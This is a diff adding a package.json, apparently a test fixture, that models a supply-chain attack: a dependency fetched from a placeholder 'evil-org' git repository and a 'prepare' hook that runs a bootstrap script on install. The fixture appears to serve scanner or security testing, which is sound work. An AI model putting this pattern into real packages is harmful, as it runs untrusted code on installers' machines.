@@ -1,0 +1,11 @@
+{
+  "name": "git-dep-rce",
+  "version": "1.0.0",
+  "description": "Git dependency with RCE via prepare script",
+  "dependencies": {
+    "legit-util": "git+https://github.com/evil-org/legit-util.git"
+  },
+  "scripts": {
+    "prepare": "node bootstrap.js"
+  }
+}
